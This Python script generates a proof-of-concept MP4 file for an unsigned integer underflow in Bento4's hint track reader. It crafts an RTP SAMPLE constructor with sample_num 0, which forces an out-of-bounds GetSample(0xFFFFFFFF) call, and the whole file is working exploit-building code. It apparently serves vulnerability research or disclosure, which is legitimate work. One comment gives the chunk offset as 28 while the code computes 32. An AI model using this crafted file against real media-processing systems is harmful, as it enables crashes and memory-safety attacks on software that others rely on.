#!/usr/bin/env python3
"""
PoC generator for VULN 003: Unsigned Integer Underflow in WriteSampleRtpData
File: Bento4/Source/C++/Core/Ap4HintTrackReader.cpp (declared in Ap4HintTrackReader.h)
CWE-191 (Integer Underflow / Wrap-around)

Vulnerability (line 331 of Ap4HintTrackReader.cpp):
    AP4_Result result = referenced_track->GetSample(
        constructor->GetSampleNum()-1,   // <-- underflow when sample_num==0
        sample);

When a SAMPLE-type RTP constructor has sample_num=0, the expression
(AP4_UI32)0 - 1 wraps to 0xFFFFFFFF.  This giant index is passed to
GetSample(), causing an out-of-bounds read/access.

Call path (requires a binary that creates AP4_HintTrackReader):
    AP4_HintTrackReader::GetNextPacket()
      -> BuildRtpPacket()
        -> WriteSampleRtpData()
          -> referenced_track->GetSample(0xFFFFFFFF, sample)  <-- OOB

Note: mp42aac does not link AP4_HintTrackReader; the binary only processes
TYPE_AUDIO tracks.  This PoC constructs the correct malicious file so that
any binary exercising AP4_HintTrackReader will trigger the underflow.
"""

import struct
import os

OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_003.mp4")

# ---------------------------------------------------------------------------
# Box helpers
# ---------------------------------------------------------------------------

def box(fourcc, data=b''):
    """Standard MP4 box: 4-byte big-endian size + 4-byte type + payload."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('latin-1')
    assert len(fourcc) == 4, f"fourcc must be 4 bytes: {fourcc!r}"
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc + data


def fullbox(fourcc, version=0, flags=0, data=b''):
    """FullBox: box header + version(1B) + flags(3B) + payload."""
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(fourcc, hdr + data)


MATRIX_UNITY = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)

# ---------------------------------------------------------------------------
# RTP Hint Sample Data (32 bytes) — the malicious payload stored in mdat
# ---------------------------------------------------------------------------
# Parsed by AP4_RtpSampleData::AP4_RtpSampleData() and AP4_RtpPacket::AP4_RtpPacket():
#
# [0-1]   packet_count  = 1         (AP4_RtpSampleData reads UI16)
# [2-3]   reserved      = 0
#
# Packet header (12 bytes, AP4_RtpPacket constructor):
# [4-7]   relative_time = 0         (ReadUI32)
# [8]     pbit/xbit     = 0x80      (ReadUI08; 0x80 = version bit always set)
# [9]     mbit/payload  = 0x00      (ReadUI08)
# [10-11] sequence_seed = 0x0000    (ReadUI16)
# [12]    ignored_byte  = 0x00      (ReadUI08, value discarded)
# [13]    flags         = 0x00      (ReadUI08; extra_flag=0, bframe=0, repeat=0)
# [14-15] constructor_count = 1     (ReadUI16)
#
# SAMPLE constructor (16 bytes, factory reads type then calls constructor):
# [16]    type               = 0x02      (ReadUI08 by factory)
# --- AP4_SampleRtpConstructor reads 15 bytes from cur_offset:
# [17]    track_ref_index    = 0x00      → use m_MediaTrack (audio track)
# [18-19] length             = 0x0000   → 0 bytes to copy
# [20-23] sample_num         = 0x00000000  ← KEY: 0 - 1 = 0xFFFFFFFF (underflow)
# [24-27] sample_offset      = 0x00000000
# [28-29] (skipped by Seek)  = 0x0001   (bytes_per_block)
# [30-31] (skipped by Seek)  = 0x0001   (samples_per_block)

hint_sample_data = (
    struct.pack('>HH', 1, 0)            # packet_count=1, reserved=0

    # --- Packet header (12 bytes) ---
    + struct.pack('>I',  0x00000000)    # relative_time = 0
    + struct.pack('>B',  0x80)          # pbit=0, xbit=0 (0x80 | 0 | 0)
    + struct.pack('>B',  0x00)          # mbit=0, payload_type=0
    + struct.pack('>H',  0x0000)        # sequence_seed = 0
    + struct.pack('>B',  0x00)          # ignored byte
    + struct.pack('>B',  0x00)          # flags: extra=0, bframe=0, repeat=0
    + struct.pack('>H',  1)             # constructor_count = 1

    # --- SAMPLE constructor (16 bytes) ---
    + struct.pack('>B',  0x02)          # type = AP4_RTP_CONSTRUCTOR_TYPE_SAMPLE
    + struct.pack('>B',  0x00)          # track_ref_index = 0 → m_MediaTrack
    + struct.pack('>H',  0x0000)        # length = 0
    + struct.pack('>I',  0x00000000)    # sample_num = 0 ← UNDERFLOW TRIGGER
    + struct.pack('>I',  0x00000000)    # sample_offset = 0
    + struct.pack('>H',  0x0001)        # bytes_per_block = 1 (padding; not read)
    + struct.pack('>H',  0x0001)        # samples_per_block = 1 (padding; not read)
)
assert len(hint_sample_data) == 32, f"hint_sample_data must be 32 bytes, got {len(hint_sample_data)}"

# ---------------------------------------------------------------------------
# File layout:
#   [  0.. 23] ftyp  (24 bytes: 8-byte header + 16-byte payload)
#   [ 24.. 63] mdat  (8-byte header + 32-byte hint sample data)
#              hint sample data at absolute offset 32
#   [ 64..   ] moov
# ---------------------------------------------------------------------------
MDAT_HEADER_SIZE = 8
HINT_SAMPLE_ABS_OFFSET = None  # computed after ftyp is built

# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------
ftyp = box('ftyp',
    b'isom'
    + struct.pack('>I', 0)
    + b'isom'
    + b'iso2'
)
# ftyp = 8 (header) + 4 (brand) + 4 (version) + 4 (compat1) + 4 (compat2) = 24 bytes
FTYP_SIZE = len(ftyp)
HINT_SAMPLE_ABS_OFFSET = FTYP_SIZE + MDAT_HEADER_SIZE  # = 32

# ---------------------------------------------------------------------------
# mdat  (contains only the hint sample data)
# ---------------------------------------------------------------------------
mdat = box('mdat', hint_sample_data)
assert len(mdat) == MDAT_HEADER_SIZE + len(hint_sample_data), \
    f"mdat size mismatch: {len(mdat)} != {MDAT_HEADER_SIZE + len(hint_sample_data)}"

# ---------------------------------------------------------------------------
# Shared helper: dinf/dref/url
# ---------------------------------------------------------------------------
def make_dinf():
    url  = fullbox('url ', 0, 1, b'')                          # flags=1 = self-contained
    dref = fullbox('dref', 0, 0, struct.pack('>I', 1) + url)   # entry_count=1
    return box('dinf', dref)


# ===========================================================================
# TRACK 1 – HINT TRACK  (handler_type='hint', track_id=1)
# ===========================================================================

tkhd_hint = fullbox('tkhd', 0, 3,
    struct.pack('>II', 0, 0)             # creation_time, modification_time
    + struct.pack('>I',  1)              # track_id = 1
    + struct.pack('>I',  0)              # reserved
    + struct.pack('>I',  0)              # duration
    + b'\x00' * 8                        # reserved
    + struct.pack('>HHH', 0, 0, 0)      # layer, alternate_group, volume
    + b'\x00' * 2                        # reserved
    + MATRIX_UNITY                        # 36-byte unity matrix
    + struct.pack('>II', 0, 0)           # width, height
)

# tref/hint: references track_id=2 (the audio track)
hint_ref_payload = struct.pack('>I', 2)  # track_id=2
hint_tref_child  = box('hint', hint_ref_payload)
tref             = box('tref', hint_tref_child)

mdhd_hint = fullbox('mdhd', 0, 0,
    struct.pack('>II', 0, 0)             # creation_time, modification_time
    + struct.pack('>I',  90000)          # timescale
    + struct.pack('>I',  0)              # duration
    + struct.pack('>H',  0x55C4)         # language 'und'
    + struct.pack('>H',  0)              # pre_defined
)

hdlr_hint = fullbox('hdlr', 0, 0,
    struct.pack('>I', 0)                 # pre_defined
    + b'hint'                            # handler_type
    + b'\x00' * 12                       # reserved
    + b'HintHandler\x00'               # name (null-terminated)
)

# stsd: one 'rtp ' entry (RTP hint sample description)
# 'rtp ' entry layout:
#   size(4) + 'rtp '(4) + reserved(6) + data_ref_index(2)
#   + hint_track_version(2) + last_compatible_version(2) + max_packet_size(4)
#   = 24 bytes total
rtp_entry_payload = (
    b'\x00' * 6                          # reserved (SampleEntry prefix)
    + struct.pack('>H', 1)               # data_reference_index = 1
    + struct.pack('>H', 1)               # hint_track_version = 1
    + struct.pack('>H', 1)               # last_compatible_version = 1
    + struct.pack('>I', 0)               # max_packet_size = 0
)
rtp_entry_box = box('rtp ', rtp_entry_payload)
stsd_hint = fullbox('stsd', 0, 0, struct.pack('>I', 1) + rtp_entry_box)

# stts: 1 entry — 1 sample with delta=1
stts_hint = fullbox('stts', 0, 0,
    struct.pack('>I',  1)                # entry_count = 1
    + struct.pack('>II', 1, 1)           # sample_count=1, sample_delta=1
)

# stsc: 1 entry — first_chunk=1, samples_per_chunk=1, sample_desc_index=1
stsc_hint = fullbox('stsc', 0, 0,
    struct.pack('>I',  1)                # entry_count = 1
    + struct.pack('>III', 1, 1, 1)       # first_chunk, samples_per_chunk, desc_idx
)

# stsz: variable-size samples (sample_size=0), 1 sample of 32 bytes
stsz_hint = fullbox('stsz', 0, 0,
    struct.pack('>II', 0, 1)             # sample_size=0 (variable), sample_count=1
    + struct.pack('>I',  32)             # entry_size[0] = 32 (size of hint_sample_data)
)

# stco: chunk 1 starts at absolute file offset 28 (the hint sample data in mdat)
stco_hint = fullbox('stco', 0, 0,
    struct.pack('>I',  1)                # entry_count = 1
    + struct.pack('>I',  HINT_SAMPLE_ABS_OFFSET)  # = 28
)

stbl_hint = box('stbl', stsd_hint + stts_hint + stsc_hint + stsz_hint + stco_hint)

nmhd = fullbox('nmhd', 0, 0, b'')       # null media header (hint tracks)

minf_hint = box('minf', nmhd + make_dinf() + stbl_hint)
mdia_hint  = box('mdia', mdhd_hint + hdlr_hint + minf_hint)
trak_hint  = box('trak', tkhd_hint + tref + mdia_hint)

# ===========================================================================
# TRACK 2 – AUDIO TRACK  (handler_type='soun', track_id=2)
# Needs to be a recognisable audio track so mp42aac doesn't abort early.
# The sample table is empty — mp42aac will find 0 samples and exit cleanly.
# ===========================================================================

# Minimal mp4a with esds (AAC-LC, 44100 Hz, 2 ch) so TYPE_MPEG is returned.
asc      = bytes([0x12, 0x10])           # AudioSpecificConfig: AAC-LC, 44100, stereo
dsi      = bytes([0x05, len(asc)]) + asc
dcd_body = (
    bytes([0x40])                        # ObjectTypeIndication = 0x40 (Audio 14496-3)
    + bytes([0x15])                      # StreamType = audio (5<<1|upstream=0|reserved=1)
    + bytes([0x00, 0x00, 0x00])          # bufferSizeDB (3 bytes)
    + struct.pack('>II', 0, 0)           # maxBitrate, avgBitrate
    + dsi
)
dcd      = bytes([0x04, len(dcd_body)]) + dcd_body
slc      = bytes([0x06, 0x01, 0x02])     # SLConfigDescriptor, predefined=2
es_body  = struct.pack('>H', 1) + bytes([0x00]) + dcd + slc
esd      = bytes([0x03, len(es_body)]) + es_body
esds     = fullbox('esds', 0, 0, esd)

mp4a_payload = (
    b'\x00' * 6                          # reserved (SampleEntry)
    + struct.pack('>H', 1)               # data_reference_index = 1
    + b'\x00' * 8                        # reserved (AudioSampleEntry)
    + struct.pack('>H', 2)               # channelcount = 2
    + struct.pack('>H', 16)              # samplesize = 16
    + struct.pack('>H', 0)               # pre_defined = 0
    + struct.pack('>H', 0)               # reserved = 0
    + struct.pack('>I', 44100 << 16)     # samplerate = 44100.0 (16.16 fixed-point)
    + esds
)
mp4a = box('mp4a', mp4a_payload)

stsd_audio = fullbox('stsd', 0, 0, struct.pack('>I', 1) + mp4a)
stts_audio = fullbox('stts', 0, 0, struct.pack('>I', 0))          # 0 entries
stsc_audio = fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz_audio = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))      # 0 samples
stco_audio = fullbox('stco', 0, 0, struct.pack('>I', 0))
stbl_audio = box('stbl', stsd_audio + stts_audio + stsc_audio + stsz_audio + stco_audio)

tkhd_audio = fullbox('tkhd', 0, 3,
    struct.pack('>II', 0, 0)
    + struct.pack('>I',  2)              # track_id = 2
    + struct.pack('>I',  0)
    + struct.pack('>I',  0)
    + b'\x00' * 8
    + struct.pack('>HHH', 0, 0, 0x0100) # layer, alt_group, volume=1.0
    + b'\x00' * 2
    + MATRIX_UNITY
    + struct.pack('>II', 0, 0)
)

mdhd_audio = fullbox('mdhd', 0, 0,
    struct.pack('>II', 0, 0)
    + struct.pack('>I',  44100)
    + struct.pack('>I',  0)
    + struct.pack('>H',  0x55C4)
    + struct.pack('>H',  0)
)

hdlr_audio = fullbox('hdlr', 0, 0,
    struct.pack('>I', 0)
    + b'soun'                            # handler_type = audio
    + b'\x00' * 12
    + b'SoundHandler\x00'
)

smhd      = fullbox('smhd', 0, 0, b'\x00' * 4)   # balance=0, reserved=0
minf_audio = box('minf', smhd + make_dinf() + stbl_audio)
mdia_audio = box('mdia', mdhd_audio + hdlr_audio + minf_audio)
trak_audio = box('trak', tkhd_audio + mdia_audio)

# ===========================================================================
# mvhd
# ===========================================================================
mvhd = fullbox('mvhd', 0, 0,
    struct.pack('>II', 0, 0)             # creation_time, modification_time
    + struct.pack('>I',  1000)           # timescale
    + struct.pack('>I',  0)              # duration
    + struct.pack('>i',  0x00010000)     # rate = 1.0
    + struct.pack('>H',  0x0100)         # volume = 1.0
    + b'\x00' * 10                       # reserved
    + MATRIX_UNITY                        # 36-byte matrix
    + b'\x00' * 24                        # pre_defined[6]
    + struct.pack('>I',  3)              # next_track_id = 3
)

# ===========================================================================
# Assemble:  ftyp | mdat | moov
# (mdat before moov so that stco offsets are simple to compute)
# ===========================================================================
moov     = box('moov', mvhd + trak_hint + trak_audio)
mp4_data = ftyp + mdat + moov

with open(OUTFILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTFILE}")
print(f"[+] File layout:")
print(f"      ftyp: offsets   0 .. {FTYP_SIZE-1} ({FTYP_SIZE} bytes)")
print(f"      mdat: offsets  {FTYP_SIZE} .. {FTYP_SIZE+len(mdat)-1} ({len(mdat)} bytes)")
print(f"        hint sample data at absolute offset {HINT_SAMPLE_ABS_OFFSET}")
print(f"      moov: offset {FTYP_SIZE+len(mdat)}")
print(f"[+] SAMPLE constructor: sample_num=0  ->  GetSampleNum()-1 = 0xFFFFFFFF (underflow)")
print(f"[+] track_ref_index=0  ->  uses m_MediaTrack (audio, track_id=2)")
print(f"[+] referenced_track->GetSample(0xFFFFFFFF, sample) -> OOB access")
